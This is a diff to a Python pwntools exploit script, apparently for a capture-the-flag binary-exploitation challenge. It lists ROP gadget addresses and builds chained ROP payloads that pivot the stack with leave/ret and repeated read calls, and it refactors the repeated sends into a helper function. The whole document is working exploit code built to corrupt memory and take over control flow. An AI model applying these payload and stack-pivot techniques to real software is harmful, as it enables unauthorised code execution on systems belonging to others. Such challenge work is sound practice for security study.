@@ -23,7 +23,9 @@ read_got = 0x4004c0
 read_plt = 0x601020
 pop_rsi_r15 = 0x00000000004006b1
 pop_rdi = 0x00000000004006b3
+pop_rbp = 0x0000000000400560
 leave_ret = 0x0000000000400646
+ret = 0x0000000000400499
 pop_rbx_rbp_r12_r13_r14_r15 = 0x4006aa
 mov_rdx_r13_rsi_r14_edi_r15d_call_QWORD_r12_rbx_8 = 0x400690
 
@@ -31,21 +33,24 @@ rop = flat([buf1+0x20, rbp_20_read_leave_ret])
 r.recvuntil(':')
 r.send(payload + rop)
 
-# now rax=0, rdi=0x0, rsi=0x601048, rdx=0x40
-rop = flat([pop_rsi_r15, read_plt, 0xdeadbeaf, read_got] + [tmp_buf, rbp_20_read_leave_ret])
-r.send(rop)
+def add_4_rop(rop_list, new_rbp):
+    """
+    args:
+        rop_list: a list contains 4 element.
+        new_rbp: the new rbp address.
+    """
+    global r
+    global tmp_buf
+    global rbp_20_read_leave_ret
+    rop = flat(rop_list + [tmp_buf, rbp_20_read_leave_ret])
+    r.send(rop)
+    rop = flat([0xaaaaaaaa]*4 + [new_rbp, rbp_20_read_leave_ret])
+    r.send(rop)
 
-rop = flat([0xaaaaaaaa, 0xaaaaaaaa, 0xaaaaaaaa, 0xaaaaaaaa] + [buf1+0x20+0x20, rbp_20_read_leave_ret])
-r.send(rop)
+add_4_rop([pop_rsi_r15, read_plt, 0xdeadbeaf, read_got], buf1+0x20+0x20)
+add_4_rop([pop_rdi, 0x1, pop_rsi_r15, read_plt], buf1+0x40+0x20)
 
-# now rax=1, read_got = syscall
-rop = flat([pop_rdi, 0x1, pop_rsi_r15, read_plt] + [tmp_buf, rbp_20_read_leave_ret])
-r.send(rop)
-
-rop = flat([0xaaaaaaaa, 0xaaaaaaaa, 0xaaaaaaaa, 0xaaaaaaaa] + [buf1+0x40+0x20, rbp_20_read_leave_ret])
-r.send(rop)
-
-rop = flat([0xdeadbeaf, read_got, leave_ret, 0xdeadbeaf, buf1-0x8, rbp_20_read_leave_ret])
+rop = flat([0xdeadbeaf, read_got, leave_ret, 0xdeadbeaf] + [buf1-0x8, rbp_20_read_leave_ret])
 r.send(rop)
 
 # r.send(p64(read_got))
